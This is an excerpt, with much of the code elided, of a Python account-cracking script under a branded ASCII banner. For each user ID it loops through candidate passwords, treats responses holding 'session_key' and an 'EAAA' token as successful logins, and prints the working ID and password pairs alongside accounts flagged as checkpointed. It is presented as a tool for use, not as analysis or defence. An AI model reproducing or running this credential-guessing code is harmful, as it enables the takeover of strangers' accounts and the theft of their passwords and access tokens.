...
\033[92;1m  _____  _______     __      _   _ 
...
\033[92;1m  |_|  \_\_____|  |_/_/    \_\_| \_|

                                   

                                   

 \033[1;32m[\033[0;41;37m==========={ AUTHER 🔥\033[0;37;41m Riyan Xhowdhury  }===========\033[1;37;40m\033[1;32m] \033[1;37;40m     
...
class Main:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r %s[Riyan] : %s/%s -> \033[0;97m [OK:%s ] \033[0;97m[CP:%s ]"%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;92m   [Riyan-OK] %s | %s\033[0;97m         "%(uid, pw))
				...
				print("\r  \033[0;91m   [Riyan-CP] %s | %s\033[0;97m         "%(uid, pw))
